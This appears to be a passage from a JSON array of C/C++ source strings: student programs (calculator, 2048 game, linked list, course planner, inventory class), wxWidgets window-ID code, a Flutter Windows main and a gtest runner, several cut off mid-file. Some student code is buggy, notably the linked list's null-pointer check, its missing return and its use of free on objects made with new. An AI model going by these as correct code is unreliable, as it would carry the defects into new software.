<< \". \" << categories[k] << \" \" << amount[k] <<endl;\n//\t}*/\n//}\n//int main()\n//{\n//\t// Takes C++ string with any separator\n//\tstring a = \"Health 500 Transport 20 Rent 30 Utilities 60 Food 50 Groceries 560\";\n//\ttokenize(a, \" \");\n//\tfor (int k = 0; k < 6; k++) {\n//\t\tcout << k + 1 << \". \"  << \" \" << user.amount[k] <<endl;\n//\t}\n//\tcout << endl;\n//\n//\treturn 0;\n//}\n",
    "#include <stdio.h>\r\n/*\r\nQ.1 Calculator\r\n\r\nDevelop a menu-driven program to implement arithmetic operations such as +, -, *, /, and %\r\nusing UDF, switch case, and looping. Make sure that the program is endless until a certain letter\r\nis pressed.\r\n\r\nExample:\r\nInput/Output:\r\nPress 1 for +\r\nPress 2 for -\r\nPress 3 for *\r\nPress 4 for /\r\nPress 5 for %\r\nPress 0 for the exit\r\n\r\nEnter your choice: 1\r\nEnter the first number: 5\r\nEnter the second number: 3\r\nAddition of 5 and 3 is 8\r\n\r\nPress 1 for +\r\nPress 2 for -\r\nPress 3 for *\r\nPress 4 for /\r\nPress 5 for %\r\nPress 0 for the exit\r\n\r\nEnter your choice: 4\r\nEnter the first number: 10\r\nEnter the second number: 5\r\nDivision of 10 and 5 is 2\r\n\r\nPress 1 for +\r\nPress 2 for -\r\nPress 3 for *\r\nPress 4 for /\r\nPress 5 for %\r\nPress 0 for the exit\r\nEnter your choice: 0\r\n*/\r\n\r\nfloat add(float a, float b) \r\n{\r\n    return a + b;\r\n}\r\n\r\n\r\nfloat subtract(float a, float b) \r\n{\r\n    return a - b;\r\n}\r\n\r\n\r\nfloat multiply(float a, float b) \r\n{\r\n    return a * b;\r\n}\r\n\r\nint modula(int a, int b) \r\n{\r\n    return a % b;\r\n}\r\n\r\nfloat divide(float a, float b)\r\n{\r\n    if (b != 0) \r\n\t{\r\n        return a / b;\r\n    } \r\n\telse \r\n\t{\r\n        printf(\"Error: Cannot divide by zero\\n\");\r\n        return 0;\r\n    }\r\n}\r\n\r\nint main() \r\n{\r\n    int choice;\r\n    float num1, num2, result;\r\n\r\n\tdo\r\n\t{\r\n        printf(\"Press 1 for +\\n\");\r\n        printf(\"Press 2 for -\\n\");\r\n        printf(\"Press 3 for *\\n\");\r\n        printf(\"Press 4 for %%\\n\");\r\n        printf(\"Press 5 for /\\n\");\r\n        printf(\"Press 0 to exit\\n\");\r\n        printf(\"Enter your choice: \");\r\n        scanf(\"%d\", &choice);\r\n\r\n        if (choice == 0) \r\n\t\t{\r\n            printf(\"Exiting the program. Goodbye!\\n\");\r\n            break;\r\n        }\r\n\r\n        printf(\"Enter the first number: \");\r\n        scanf(\"%f\", &num1);\r\n        printf(\"Enter the second number: \");\r\n        scanf(\"%f\", &num2);\r\n\r\n        switch (choice) \r\n\t\t{\r\n            case 1:\r\n                result = add(num1, num2);\r\n                break;\r\n            case 2:\r\n                result = subtract(num1, num2);\r\n                break;\r\n            case 3:\r\n                result = multiply(num1, num2);\r\n                break;\r\n             case 4:\r\n            \tresult = modula(num1,num2);\r\n            \tbreak;\r\n            case 5:\r\n                result = divide(num1, num2);\r\n                break;\r\n           \r\n            default:\r\n                printf(\"Invalid choice. Please select a valid operation.\\n\");\r\n                continue;\r\n        }\r\n\r\n        printf(\"Result: %.2f\\n\\n\", result);\r\n    }while(1); \r\n\r\n\r\n    return 0;\r\n}\r\n",
    "#include <iostream>\n#include <ctime>\n#include <iomanip>\n#include <cstdlib>\n\nusing namespace std;\n\nint board[4][4];\nint best = 0, score = 0;\n\nvoid startPieces() {\n\tbool addFirst = false, addSecond = false;\n\tint piece1 = 0, piece2 = 0;\n\tint r_pos = 0, c_pos = 0;\n\twhile (!addFirst) \n\t{\n\t\tr_pos = rand() % 4;\n\t\tc_pos = rand() % 4;\n\t\tif (board[r_pos][c_pos] == 0) {\n\t\t\tpiece1 = (rand() % 2) + 1;\n\t\t\tboard[r_pos][c_pos] = piece1;\n\t\t\taddFirst = true;\n\t\t}\n\t}\n\twhile (!addSecond) \n\t{\n\t\tr_pos = rand() % 4;\n\t\tc_pos = rand() % 4;\n\t\tif (board[r_pos][c_pos] == 0) \n\t\t{\n\t\t\tpiece2 = (rand() % 2) + 1;\n\t\t\tboard[r_pos][c_pos] = piece2;\n\t\t\taddSecond = true;\n\t\t}\n\t}\n}\nvoid newGame() {\n\tfor (int i = 0;i < 4;i++) {\n\t\tfor (int j = 0;j < 4;j++) {\n\t\t\tboard[i][j] = 0;\n\t\t}\n\t}\n\tscore = 0;\n\tstartPieces();\n}\nvoid printUI() {\n    system(\"cls\");\n\tfor (int i = 0;i < 21;i++)\n\t\tcout << \"-\";\n\tcout << endl;\n\tfor (int i = 0;i < 4;i++) \n\t{\n\t\tcout << \"|\";\n\t\tfor (int j = 0;j < 4;j++) \n\t\t{\n\t\t\tif (board[i][j] == 0) \n\t\t\t{\n\t\t\t\tcout << setw(4) << \" \";\n\t\t\t}\n\t\t\telse \n\t\t\t{\n\t\t\t\tcout << setw(4) << board[i][j];\n\t\t\t}\n\t\t\tcout << \"|\";\n\t\t}\n\t\tcout << endl;\n\t\tfor (int k = 0;k < 21;k++)\n\t\t\tcout << \"-\";\n\t\tcout << endl;\n\t}\n\tcout << \"Score: \" << score << \"\\t\" << \"Best: \" << best << endl;\n\tcout << \"Instructions: \\n\";\n\tcout << \"Press 'w' to move UP\\n\" << \"Press 'a' to move LEFT\\n\" << \"Press 's' to move DOWN\\n\" << \"Press 'd' to move RIGHT\\n\" << \"Press 'n' for NEWGAME\\n\" << \"Press 'q' to QUIT\\n\";\n}\nbool winCon() {\n\tfor (int i = 0;i < 4;i++) \n\t{\n\t\tfor (int j = 0;j < 4;j++) \n\t\t{\n\t\t\tif (board[i][j] == 1024)\n\t\t\t\treturn true;\n\t\t}\n\t}\n\treturn false;\n}\nbool loseCon() \n{\n\tfor (int i = 0;i < 4;i++) \n\t{\n\t\tfor (int j = 0;j < 4;j++) \n\t\t{\n\t\t\tif (board[i][j] == 0)\n\t\t\t\treturn false;\n\t\t}\n\t}\n\tfor (int i = 0;i < 4;i++) \n\t{\n\t\tfor (int j = 0;j < 4;j++) \n\t\t{\n\t\t\tif (i == 0) \n\t\t\t{\n\t\t\t\tif (j == 0) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i][j + 1]) || (board[i][j] == board[i + 1][j]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tif (j == 1 || j == 2) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i][j + 1]) || (board[i][j] == board[i + 1][j]) || (board[i][j] == board[i][j - 1]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tif (j == 3) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i][j - 1]) || (board[i][j] == board[i + 1][j]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (i == 1 || i == 2) \n\t\t\t{\n\t\t\t\tif (j == 0) {\n\t\t\t\t\tif ((board[i][j] == board[i - 1][j]) || (board[i][j] == board[i][j + 1]) || (board[i][j] == board[i + 1][j]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tif (j == 1 || j == 2) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i - 1][j]) || (board[i][j] == board[i][j - 1]) || (board[i][j] == board[i + 1][j]) || (board[i][j] == board[i][j + 1]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tif (j == 3) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i][j - 1]) || (board[i][j] == board[i - 1][j]) || (board[i][j] == board[i + 1][j]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif (i == 3) \n\t\t\t{\n\t\t\t\tif (j == 0) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i - 1][j]) || (board[i][j] == board[i][j + 1]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tif (j == 1 || j == 2) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i][j - 1]) || (board[i][j] == board[i - 1][j]) || (board[i][j] == board[i][j + 1]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t\tif (j == 3) \n\t\t\t\t{\n\t\t\t\t\tif ((board[i][j] == board[i - 1][j]) || (board[i][j] == board[i][j - 1]))\n\t\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn true;\n}\nvoid addPiece() \n{\n\tbool added = false;\n\tint r_pos = 0, c_pos = 0;\n\tint piece = 0;\n\twhile (!added) \n\t{\n\t\tr_pos = rand() % 4;\n\t\tc_pos = rand() % 4;\n\t\tif (board[r_pos][c_pos] == 0) \n\t\t{\n\t\t\tpiece = (rand() % 2) + 1;\n\t\t\tboard[r_pos][c_pos] = piece;\n\t\t\tadded = true;\n\t\t}\n\t}\n}\nvoid up() \n{\n\tbool flag = false, toAdd = false;\n\tfor (int i = 1;i < 4;i++) \n\t{\n\t\tfor (int j = 0;j < 4;j++) \n\t\t{\n\t\t\tif (board[i][j] == board[i - 1][j] || board[i - 1][j] == 0) \n\t\t\t{\n\t\t\t\tflag = true;\n\t\t\t\tfor (int k = i;k > 0 && flag;k--) \n\t\t\t\t{\n\t\t\t\t\tif (board[k][j] != board[k - 1][j] && board[k - 1][j] != 0) \n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t}\n\t\t\t\t\telse \n\t\t\t\t\t{\n\t\t\t\t\t\tif (board[k - 1][j] == board[k][j]) \n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tscore += (board[k - 1][j] + board[k][j]);\n\t\t\t\t\t\t\tif (best < score)\n\t\t\t\t\t\t\t\tbest = score;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tboard[k - 1][j] += board[k][j];\n\t\t\t\t\t\tif (board[k][j] > 0)\n\t\t\t\t\t\t\ttoAdd = true;\n\t\t\t\t\t\tboard[k][j] = 0;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (toAdd)\n\t\taddPiece();\n}\nvoid down() \n{\n\tbool flag = false, toAdd = false;\n\tfor (int i = 2;i >= 0;i--) \n\t{\n\t\tfor (int j = 0;j < 4;j++) \n\t\t{\n\t\t\tif (board[i][j] == board[i + 1][j] || board[i + 1][j] == 0) \n\t\t\t{\n\t\t\t\tflag = true;\n\t\t\t\tfor (int k = i;k < 3 && flag;k++) \n\t\t\t\t{\n\t\t\t\t\tif (board[k][j] != board[k + 1][j] && board[k + 1][j] != 0) \n\t\t\t\t\t{\n\t\t\t\t\t\tflag = false;\n\t\t\t\t\t}\n\t\t\t\t\telse \n\t\t\t\t\t{\n\t\t\t\t\t\tif (board[k + 1][j] == board[k][j]) \n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tscore += (board[k + 1][j] + board[k][j]);\n\t\t\t\t\t\t\tif (best < score)\n\t\t\t\t\t\t\t\tbest = score;\n\t\t\t\t\t\t}\n\t\t\t\t\t\tboard[k + 1][j] += board[k][j];\n\t\t\t\t\t\tif (board[k][j] > 0)\n\t\t\t\t\t\t\ttoAdd = true;\n\t\t\t\t\t\tboard[k][j] = 0;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\tif (toAdd)\n\t\taddPiece();\n}\nvoid left() \n{\n\tbool flag = false, toAdd = false;\n\tfor (int j = 1;j < ",
    "///////////////////////////////////////////////////////////////////////////////\n// Name:        src/common/windowid.cpp\n// Purpose:     wxWindowID class - a class for managing window ids\n// Author:      Brian Vanderburg II\n// Created:     2007-09-21\n// Copyright:   (c) 2007 Brian Vanderburg II\n// Licence:     wxWindows licence\n///////////////////////////////////////////////////////////////////////////////\n\n// ----------------------------------------------------------------------------\n// Needed headers\n// ----------------------------------------------------------------------------\n#include \"wx/wxprec.h\"\n\n#ifdef __BORLANDC__\n    #pragma hdrstop\n#endif\n\n#ifndef WX_PRECOMP\n    #include \"wx/log.h\"\n    #include \"wx/intl.h\"\n#endif //WX_PRECOMP\n\n#include \"wx/hashmap.h\"\n\n// Not needed, included in defs.h\n// #include \"wx/windowid.h\"\n\n#define wxTRACE_WINDOWID wxT(\"windowid\")\n\nnamespace\n{\n\n#if wxUSE_AUTOID_MANAGEMENT\n\n\n// initially no ids are in use and we allocate them consecutively, but after we\n// exhaust the entire range, we wrap around and reuse the ids freed in the\n// meanwhile\nstatic const wxUint8 ID_FREE = 0;\nstatic const wxUint8 ID_STARTCOUNT = 1;\nstatic const wxUint8 ID_COUNTTOOLARGE = 254;\nstatic const wxUint8 ID_RESERVED = 255;\n\n// we use a two level count, most IDs will be used less than ID_COUNTTOOLARGE-1\n// thus we store their count directly in this array, however when the same ID\n// is reused a great number of times (more than or equal to ID_COUNTTOOLARGE),\n// the hash map stores the actual count\nwxUint8 gs_autoIdsRefCount[wxID_AUTO_HIGHEST - wxID_AUTO_LOWEST + 1] = { 0 };\n\n// NB: this variable is allocated (again) only when an ID gets at least\n// ID_COUNTTOOLARGE refs, and is freed when the latest entry in the map gets\n// freed. The cell storing the count for an ID is freed only when its count\n// gets to zero (not when it goes below ID_COUNTTOOLARGE, so as to avoid\n// degenerate cases)\nwxLongToLongHashMap *gs_autoIdsLargeRefCount = NULL;\n\n// this is an optimization used until we wrap around wxID_AUTO_HIGHEST: if this\n// value is < wxID_AUTO_HIGHEST we know that we haven't wrapped yet and so can\n// allocate the ids simply by incrementing it\nwxWindowID gs_nextAutoId = wxID_AUTO_LOWEST;\n\n// Reserve an ID\nvoid ReserveIdRefCount(wxWindowID winid)\n{\n    wxCHECK_RET(winid >= wxID_AUTO_LOWEST && winid <= wxID_AUTO_HIGHEST,\n            wxT(\"invalid id range\"));\n\n    winid -= wxID_AUTO_LOWEST;\n\n    wxCHECK_RET(gs_autoIdsRefCount[winid] == ID_FREE,\n            wxT(\"id already in use or already reserved\"));\n    gs_autoIdsRefCount[winid] = ID_RESERVED;\n}\n\n// Unreserve and id\nvoid UnreserveIdRefCount(wxWindowID winid)\n{\n    wxCHECK_RET(winid >= wxID_AUTO_LOWEST && winid <= wxID_AUTO_HIGHEST,\n            wxT(\"invalid id range\"));\n\n    winid -= wxID_AUTO_LOWEST;\n\n    wxCHECK_RET(gs_autoIdsRefCount[winid] == ID_RESERVED,\n            wxT(\"id already in use or not reserved\"));\n    gs_autoIdsRefCount[winid] = ID_FREE;\n}\n\n// Get the usage count of an id\nint GetIdRefCount(wxWindowID winid)\n{\n    wxCHECK_MSG(winid >= wxID_AUTO_LOWEST && winid <= wxID_AUTO_HIGHEST, 0,\n            wxT(\"invalid id range\"));\n\n    winid -= wxID_AUTO_LOWEST;\n    int refCount = gs_autoIdsRefCount[winid];\n    if (refCount == ID_COUNTTOOLARGE)\n        refCount = (*gs_autoIdsLargeRefCount)[winid];\n    return refCount;\n}\n\n// Increase the count for an id\nvoid IncIdRefCount(wxWindowID winid)\n{\n    wxCHECK_RET(winid >= wxID_AUTO_LOWEST && winid <= wxID_AUTO_HIGHEST,\n            wxT(\"invalid id range\"));\n\n    winid -= wxID_AUTO_LOWEST;\n\n    wxCHECK_RET(gs_autoIdsRefCount[winid] != ID_FREE, wxT(\"id should first be reserved\"));\n\n    if(gs_autoIdsRefCount[winid] == ID_RESERVED)\n    {\n        gs_autoIdsRefCount[winid] = ID_STARTCOUNT;\n    }\n    else if (gs_autoIdsRefCount[winid] >= ID_COUNTTOOLARGE-1)\n    {\n        if (gs_autoIdsRefCount[winid] == ID_COUNTTOOLARGE-1)\n        {\n            // we need to allocate a cell, and maybe the hash map itself\n            if (!gs_autoIdsLargeRefCount)\n                gs_autoIdsLargeRefCount = new wxLongToLongHashMap;\n            (*gs_autoIdsLargeRefCount)[winid] = ID_COUNTTOOLARGE-1;\n\n            gs_autoIdsRefCount[winid] = ID_COUNTTOOLARGE;\n        }\n        ++(*gs_autoIdsLargeRefCount)[winid];\n    }\n    else\n    {\n        gs_autoIdsRefCount[winid]++;\n    }\n\n    wxLogTrace(wxTRACE_WINDOWID, wxT(\"Increasing ref count of ID %d to %d\"),\n            winid + wxID_AUTO_LOWEST, GetIdRefCount(winid + wxID_AUTO_LOWEST));\n}\n\n// Decrease the count for an id\nvoid DecIdRefCount(wxWindowID winid)\n{\n    wxCHECK_RET(winid >= wxID_AUTO_LOWEST && winid <= wxID_AUTO_HIGHEST,\n            wxT(\"invalid id range\"));\n\n    winid -= wxID_AUTO_LOWEST;\n\n    wxCHECK_RET(gs_autoIdsRefCount[winid] != ID_FREE, wxT(\"id count already 0\"));\n\n    // DecIdRefCount is only called on an ID that has been IncIdRefCount'ed'\n    // so it should never be reserved, but test anyway\n    if(gs_autoIdsRefCount[winid] == ID_RESERVED)\n    {\n        wxFAIL_MSG(wxT(\"reser",
    "#include <iostream>\n#include <vector>\nusing namespace std;\n\nclass Node\n{\npublic:\n    int data;\n    Node *next;\n    Node *back;\n\n    Node(int data1, Node *next1, Node *back1)\n    {\n        data = data1;\n        next = next1;\n        back = back1;\n    }\n\n    Node(int data1)\n    {\n        data = data1;\n        next = nullptr;\n        back = nullptr;\n    }\n};\n\nNode *converArr2Dll(vector<int> &arr)\n{\n    Node *head = new Node(arr[0]);\n    Node *prev = head;\n    for (int i = 1; i < arr.size(); i++)\n    {\n        Node *temp = new Node(arr[i], nullptr, prev);\n        prev->next = temp;\n        prev = temp;\n    }\n    return head;\n}\n\nvoid print(Node *head)\n{\n    while (head != NULL)\n    {\n        cout << head->data << \" \";\n        head = head->next;\n    }\n}\n\nNode *deleteHeadOf2LL(Node *head)\n{\n    if (head == NULL && head->next == NULL)\n    {\n        return NULL;\n    }\n\n    Node *prev = head;\n    head = head->next;\n\n    head->back = nullptr;\n    prev->next = nullptr;\n\n    delete prev;\n    return head;\n}\n\nNode *deleteTail(Node *head)\n{\n    if (head == NULL && head->next == NULL)\n    {\n        return NULL;\n    }\n\n    Node *tail = head;\n    if (tail->next != NULL)\n    {\n        tail = tail->next;\n    }\n    Node *newTail = tail->back;\n}\n\nNode *removeKthElement(Node *head, int k)\n{\n    if (head == NULL)\n    {\n        return NULL;\n    }\n    int cnt = 0;\n    Node *kNode = head;\n    while (kNode != NULL)\n    {\n        cnt++;\n        if (cnt == k)\n            break;\n        kNode = kNode->next;\n    }\n    Node *prev = kNode->back;\n    Node *front = kNode->next;\n\n    if (prev == NULL && front == NULL)\n    {\n        return NULL;\n    }\n    else if (prev == NULL)\n    {\n        return deleteHeadOf2LL(head);\n    }\n    else if (front == NULL)\n    {\n        return deleteTail(head);\n    }\n\n    prev->next = front;\n    front->back = prev;\n\n    kNode->next = nullptr;\n    kNode->back = nullptr;\n    delete kNode;\n    return head;\n}\n\nvoid deleteNode(Node*temp){\n    Node*prev  = temp->back;\n    Node*front = temp->next;\n\n    if(front == NULL){\n        prev->next = nullptr;\n        temp->back = nullptr;\n        free(temp);\n        return; \n    }\n    prev->next = front;\n    front->back = prev;\n\n    temp->next = temp->back = nullptr;\n    free(temp);\n}\n\nint main()\n{\n    vector<int> arr = {9, 4, 6, 7};\n\n    Node *head = converArr2Dll(arr);\n    deleteNode(head->next->next);\n    print(head);\n    return 0;\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <vector>\r\n#include <map>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nclass Course {\r\npublic:\r\n    string courseId;\r\n    string title;\r\n    vector<string> prerequisites;\r\n\r\n    // Default constructor\r\n    Course() = default;\r\n\r\n    // Parameterized constructor\r\n    Course(string id, string name, vector<string> prereqs) {\r\n        courseId = id;\r\n        title = name;\r\n        prerequisites = prereqs;\r\n    }\r\n};\r\n\r\nvoid loadCourses(const string& filename, map<string, Course>& courses) {\r\n    ifstream file(filename);\r\n\r\n    if (!file.is_open()) {\r\n        cout << \"Could not open file \" << filename << endl;\r\n        return;\r\n    }\r\n\r\n    string line;\r\n    while (getline(file, line)) {\r\n        stringstream ss(line);\r\n        string id, name, prereq;\r\n        vector<string> prereqs;\r\n\r\n        getline(ss, id, ',');\r\n        getline(ss, name, ',');\r\n\r\n        while (getline(ss, prereq, ',')) {\r\n            prereqs.push_back(prereq);\r\n        }\r\n\r\n        courses[id] = Course(id, name, prereqs);\r\n    }\r\n\r\n    file.close();\r\n    cout << \"Courses loaded successfully!\" << endl;\r\n}\r\n\r\nvoid printCourseList(const map<string, Course>& courses) {\r\n    vector<string> courseIds;\r\n    for (const auto& entry : courses) {\r\n        courseIds.push_back(entry.first);\r\n    }\r\n\r\n    sort(courseIds.begin(), courseIds.end());\r\n\r\n    cout << \"Here is a sample schedule:\" << endl;\r\n    for (const string& id : courseIds) {\r\n        cout << id << \", \" << courses.at(id).title << endl;\r\n    }\r\n}\r\n\r\nvoid printCourseDetails(const map<string, Course>& courses, const string& courseId) {\r\n    auto it = courses.find(courseId);\r\n    if (it != courses.end()) {\r\n        cout << it->second.courseId << \", \" << it->second.title << endl;\r\n        cout << \"Prerequisites: \";\r\n        for (size_t i = 0; i < it->second.prerequisites.size(); ++i) {\r\n            cout << it->second.prerequisites[i];\r\n            if (i < it->second.prerequisites.size() - 1) {\r\n                cout << \", \";\r\n            }\r\n        }\r\n        cout << endl;\r\n    }\r\n    else {\r\n        cout << \"Course not found.\" << endl;\r\n    }\r\n}\r\n\r\nvoid displayMenu() {\r\n    cout << \"1. Load Data Structure.\" << endl;\r\n    cout << \"2. Print Course List.\" << endl;\r\n    cout << \"3. Print Course.\" << endl;\r\n    cout << \"9. Exit\" << endl;\r\n    cout << \"What would you like to do? \";\r\n}\r\n\r\nint main() {\r\n    map<string, Course> courses;\r\n    string filename;\r\n    int choice;\r\n\r\n    cout << \"Welcome to the course planner.\" << endl;\r\n\r\n    while (true) {\r\n        displayMenu();\r\n        cin >> choice;\r\n\r\n        // Handle invalid input\r\n        if (cin.fail()) {\r\n            cin.clear(); // Clear the error flag\r\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n'); // Ignore the rest of the input\r\n            cout << \"Invalid input. Please enter a valid option.\" << endl;\r\n            continue;\r\n        }\r\n\r\n        switch (choice) {\r\n        case 1:\r\n            cout << \"Enter the filename to load: \";\r\n            cin >> filename;\r\n            loadCourses(filename, courses);\r\n            break;\r\n        case 2:\r\n            if (courses.empty()) {\r\n                cout << \"No courses loaded. Please load the data first.\" << endl;\r\n            }\r\n            else {\r\n                printCourseList(courses);\r\n            }\r\n            break;\r\n        case 3: {\r\n            if (courses.empty()) {\r\n                cout << \"No courses loaded. Please load the data first.\" << endl;\r\n            }\r\n            else {\r\n                cout << \"What course do you want to know about? \";\r\n                string courseId;\r\n                cin >> courseId;\r\n                transform(courseId.begin(), courseId.end(), courseId.begin(), ::toupper);\r\n                printCourseDetails(courses, courseId);\r\n            }\r\n            break;\r\n        }\r\n        case 9:\r\n            cout << \"Thank you for using the course planner!\" << endl;\r\n            return 0;\r\n        default:\r\n            cout << choice << \" is not a valid option.\" << endl;\r\n            break;\r\n        }\r\n    }\r\n}\r\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weatherapi\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <gtest/gtest.h>\n#include <gmock/gmock.h>\n#include <iostream>\n\nclass TestEventListener : public testing::EmptyTestEventListener\n{\npublic:\n    void OnTestProgramStart(const testing::UnitTest &unit_test) override\n    {\n        std::cout << \"Starting test program. Total test suites: \"\n                  << unit_test.total_test_suite_count() << std::endl;\n    }\n\n    void OnTestSuiteStart(const testing::TestSuite &test_suite) override\n    {\n        std::cout << \"Starting test suite: \" << test_suite.name() << std::endl;\n    }\n\n    void OnTestStart(const testing::TestInfo &test_info) override\n    {\n        std::cout << \"Starting test: \" << test_info.name() << std::endl;\n    }\n};\n\nint main(int argc, char **argv)\n{\n    std::cout << \"Initializing Google Test...\" << std::endl;\n    ::testing::InitGoogleTest(&argc, argv);\n\n    std::cout << \"Initializing Google Mock...\" << std::endl;\n    ::testing::InitGoogleMock(&argc, argv);\n\n    ::testing::TestEventListeners &listeners = ::testing::UnitTest::GetInstance()->listeners();\n    listeners.Append(new TestEventListener);\n\n    std::cout << \"Running all tests...\" << std::endl;\n    return RUN_ALL_TESTS();\n}",
    "#include <iostream>\nusing namespace std;\n\nclass inventory\n{\nprivate:\n    int itemNumber;   // An int that holds the item's number\n    int quantity;     // An int for holding the quantity of the items on hand\n    double cost;      // A double for holding the wholesale per-unit cost of the item\n    double totalCost; // A double for holding the total inventory cost of the item (calculated as quantity times cost)\n\npublic:\n    inventory() // DefaultConstructor - Sets all the member variables to 0\n    {\n        itemNumber = 0;\n        quantity = 0;\n        cost = 0;\n        totalCost = 0;\n    };\n    inventory(int itemNum, int quantityNum, double costNum) : itemNumber(itemNum), quantity(quantityNum), cost(costNum) // Constructor #2\n    {\n        setTotalCost();\n    }\n\n    // Set functions\n    void setItemNumber(int itemNum) // Accepts an integer argument that is copied to the itemNumber member variable\n    {\n\n        itemNumber = itemNum;\n    }\n\n    void setQuantity(int quantityNum) // Accepts an integer argument that is copied to the quantity member variable\n    {\n\n        quantity = quantityNum;\n    }\n\n    void setCost(double costNum) // Accepts a double argument that is copied to the cost member variable\n    {\n\n        cost = costNum;\n    }\n\n    void setTotalCost() // Calculates the total inventory cost for the item (quantity times cost) and stores the result in totalCost\n    {\n        totalCost = cost * quantity;\n    }\n\n    // Get functions\n    int getItemNumber() const { return itemNumber; }\n    int getQuantity() const { return quantity; }\n    double getCost() const { return cost; }\n    double getTotalCost() const { return totalCost; }\n};\n\n// item1 will be input from user and item2 will be fixed number and item3 will be default\nint main()\n{\n    int itemNum;\n    int quantityNum;\n    double costNum;\n\n    // Create an instance using the default constructor\n    inventory item1;\n    inventory item3;\n\n    // Create an instance using the parameterized constructor\n    cout << \"Input item1 number: \";\n    cin >> itemNum;\n    while (itemNum < 0)\n    {\n        cout << \"Item number can't be less than zero, please input again: \";\n        cin >> itemNum;\n    }\n\n    cout << \"Input item1 quantity: \";\n    cin >> quantityNum;\n    while (quantityNum < 0)\n    {\n        cout << \"Quantity number can't be less than zero, please input again: \";\n        cin >> quantityNum;\n    }\n\n    cout << \"Input item1 cost: \";\n    cin >> costNum;\n    while (costNum < 0)\n    {\n        cout << \"Cost of the item can't be less than zero, please input again: \";\n        cin >> costNum;\n    }\n\n    // Update item1 using setters\n    item1.setItemNumber(itemNum);\n    item1.setQuantity(quantityNum);\n    item1.setCost(costNum);\n    item1.setTotalCost();\n\n    // Update fixed value for item2\n    inventory item2(2, 3, 4.4);\n\n    // Print all result\n    // item1\n    cout << \"----------------------------\\n\"\n         << \"The item Number #\" << item1.getItemNumber() << '\\n'\n         << \"The Quantity of this item #\" << item1.getQuantity() << '\\n'\n         << \"The Cost of this item $\" << item1.getCost() << '\\n'\n         << \"The Total Cost of this item $\" << item1.getTotalCost() << '\\n';\n    // item2\n    cout << \"----------------------------\\n\"\n         << \"The item Number #\" << item2.getItemNumber() << '\\n'\n         << \"The Quantity of this item #\" << item2.getQuantity() << '\\n'\n         << \"The Cost of this item $\" << item2.getCost() << '\\n'\n         << \"The Total Cost of this item $\" << item2.getTotalCost() << '\\n';\n    // item3\n    cout << \"----------------------------\\n\"\n         << \"The item Number #\" << item3.getItemNumber() << '\\n'\n         << \"The Quantity of this item #\" << item3.getQuantity() << '\\n'\n         << \"The Cost of this item $\" << item3.getCost() << '\\n'\n         << \"The Total Cost of this item $\" << item3.getTotalCost() << '\\n';\n\n    return 0;\n}",
